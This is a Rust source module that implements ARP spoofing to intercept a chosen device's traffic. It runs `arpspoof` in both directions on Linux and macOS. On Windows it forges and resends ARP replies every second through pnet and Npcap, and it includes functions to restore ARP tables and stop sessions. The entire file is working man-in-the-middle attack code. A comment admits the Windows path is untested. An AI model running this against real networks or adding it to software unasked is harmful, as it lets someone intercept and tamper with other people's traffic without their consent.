//! Puts this machine in the middle of a device's traffic. Linux and macOS
//! both have `arpspoof` (dsniff) on `PATH` — Linux via the distro package,
//! macOS via `brew install dsniff` — so they share one implementation.
//! Windows has no such tool and blocks raw Ethernet sends without a capture
//! driver, so it forges the ARP replies itself via `pnet` (which talks to
//! Npcap). The Windows path is unverified against real hardware in this
//! session — no Windows build/test environment was available.

use crate::state::{log_event, State};
use std::sync::{Arc, Mutex};

pub enum SpoofSession {
    /// Linux/macOS: the two `arpspoof` child processes (gateway->target and
    /// target->gateway).
    Children(Box<std::process::Child>, Box<std::process::Child>),
    #[cfg(target_os = "windows")]
    /// Windows: a background thread sending forged ARP replies, stopped via
    /// the flag.
    Thread(
        std::sync::Arc<std::sync::atomic::AtomicBool>,
        std::thread::JoinHandle<()>,
    ),
}

#[cfg(unix)]
mod imp {
    use super::SpoofSession;
    use std::process::{Command, Stdio};

    pub fn start(iface: &str, gateway: &str, ip: &str) -> Option<SpoofSession> {
        let c1 = Command::new("arpspoof")
            .args(["-i", iface, "-t", ip, gateway])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn();
        let c2 = Command::new("arpspoof")
            .args(["-i", iface, "-t", gateway, ip])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn();
        match (c1, c2) {
            (Ok(c1), Ok(c2)) => Some(SpoofSession::Children(Box::new(c1), Box::new(c2))),
            _ => None,
        }
    }

    pub fn stop(session: SpoofSession) {
        #[allow(irrefutable_let_patterns)]
        if let SpoofSession::Children(mut c1, mut c2) = session {
            let _ = c1.kill();
            let _ = c1.wait();
            let _ = c2.kill();
            let _ = c2.wait();
        }
    }

    pub fn restore_arp(iface: &str, ip: &str) {
        crate::system::run_quiet("arping", &["-c", "2", "-A", "-I", iface, ip]);
    }

    pub fn kill_all(iface: &str) {
        crate::system::run_quiet("pkill", &["-f", &format!("arpspoof -i {iface}")]);
    }
}

#[cfg(target_os = "windows")]
mod imp {
    //! Forges ARP replies telling `ip` that the gateway's MAC is ours, and
    //! telling the gateway that `ip`'s MAC is ours, every second — the same
    //! technique `arpspoof` uses, sent via `pnet`'s raw Ethernet channel
    //! (backed by Npcap on Windows). Requires Npcap installed with
    //! "WinPcap API-compatible Mode".

    use super::SpoofSession;
    use pnet::datalink::{self, Channel, NetworkInterface};
    use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
    use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
    use pnet::packet::Packet;
    use pnet::util::MacAddr;
    use std::net::Ipv4Addr;
    use std::str::FromStr;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;
    use std::thread;
    use std::time::Duration;

    fn find_interface(name: &str) -> Option<NetworkInterface> {
        datalink::interfaces()
            .into_iter()
            .find(|i| i.name == name || i.description == name)
    }

    fn build_arp_reply(src_mac: MacAddr, src_ip: Ipv4Addr, dst_mac: MacAddr, dst_ip: Ipv4Addr) -> Vec<u8> {
        let mut arp_buf = [0u8; 28];
        let mut arp = MutableArpPacket::new(&mut arp_buf).unwrap();
        arp.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp.set_protocol_type(EtherTypes::Ipv4);
        arp.set_hw_addr_len(6);
        arp.set_proto_addr_len(4);
        arp.set_operation(ArpOperations::Reply);
        arp.set_sender_hw_addr(src_mac);
        arp.set_sender_proto_addr(src_ip);
        arp.set_target_hw_addr(dst_mac);
        arp.set_target_proto_addr(dst_ip);

        let mut eth_buf = vec![0u8; 42];
        let mut eth = MutableEthernetPacket::new(&mut eth_buf).unwrap();
        eth.set_destination(dst_mac);
        eth.set_source(src_mac);
        eth.set_ethertype(EtherTypes::Arp);
        eth.set_payload(arp.packet());
        eth_buf
    }

    /// Looks up a MAC via one ARP request/response round-trip on `iface`.
    /// Best-effort: returns `None` (caller retries next tick) on failure.
    fn resolve_mac(iface: &NetworkInterface, target_ip: Ipv4Addr) -> Option<MacAddr> {
        let out = crate::system::try_run("arp", &["-a", &target_ip.to_string()]).ok()?;
        for line in out.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.first() == Some(&target_ip.to_string().as_str()) {
                if let Some(mac) = parts.get(1) {
                    return MacAddr::from_str(&mac.replace('-', ":")).ok();
                }
            }
        }
        let _ = iface;
        None
    }

    pub fn start(iface: &str, gateway: &str, ip: &str) -> Option<SpoofSession> {
        let interface = find_interface(iface)?;
        let my_mac = interface.mac?;
        let gateway_ip = Ipv4Addr::from_str(gateway).ok()?;
        let target_ip = Ipv4Addr::from_str(ip).ok()?;

        let (mut tx, _rx) = match datalink::channel(&interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            _ => return None,
        };

        let stop = Arc::new(AtomicBool::new(false));
        let stop_clone = Arc::clone(&stop);
        let handle = thread::spawn(move || {
            while !stop_clone.load(Ordering::Relaxed) {
                if let Some(target_mac) = resolve_mac(&interface, target_ip) {
                    let frame = build_arp_reply(my_mac, gateway_ip, target_mac, target_ip);
                    let _ = tx.send_to(&frame, None);
                }
                if let Some(gw_mac) = resolve_mac(&interface, gateway_ip) {
                    let frame = build_arp_reply(my_mac, target_ip, gw_mac, gateway_ip);
                    let _ = tx.send_to(&frame, None);
                }
                thread::sleep(Duration::from_secs(1));
            }
        });

        Some(SpoofSession::Thread(stop, handle))
    }

    pub fn stop(session: SpoofSession) {
        if let SpoofSession::Thread(stop, handle) = session {
            stop.store(true, Ordering::Relaxed);
            let _ = handle.join();
        }
    }

    /// Sends a gratuitous ARP so `ip` and the gateway both re-learn the real
    /// MAC once we stop impersonating it.
    pub fn restore_arp(iface: &str, ip: &str) {
        let Some(interface) = find_interface(iface) else { return };
        let Some(my_ip) = interface.ips.iter().find_map(|n| match n.ip() {
            std::net::IpAddr::V4(v4) => Some(v4),
            _ => None,
        }) else {
            return;
        };
        let Ok(target_ip) = Ipv4Addr::from_str(ip) else { return };
        let Some(real_mac) = resolve_mac(&interface, target_ip) else {
            return;
        };
        if let Ok(Channel::Ethernet(mut tx, _)) = datalink::channel(&interface, Default::default()) {
            let frame = build_arp_reply(real_mac, target_ip, MacAddr::broadcast(), my_ip);
            let _ = tx.send_to(&frame, None);
        }
    }

    pub fn kill_all(_iface: &str) {
        // Windows sessions are stopped individually via their thread handle
        // (see `stop`); there's no separate process to reap.
    }
}

/// Starts ARP-spoofing a device. No-ops (and logs) if it fails to start,
/// leaving the device untouched so the next scan retries it.
pub fn start_spoof(iface: &str, gateway: &str, ip: &str, state: &Arc<Mutex<State>>) -> Option<SpoofSession> {
    let session = imp::start(iface, gateway, ip);
    if session.is_none() {
        log_event(state, &format!("Failed to start ARP spoofing for {ip}, will retry"));
    }
    session
}

pub fn stop_spoof(session: SpoofSession) {
    imp::stop(session);
}

pub fn restore_arp(iface: &str, ip: &str) {
    imp::restore_arp(iface, ip);
}

pub fn kill_all(iface: &str) {
    imp::kill_all(iface);
}
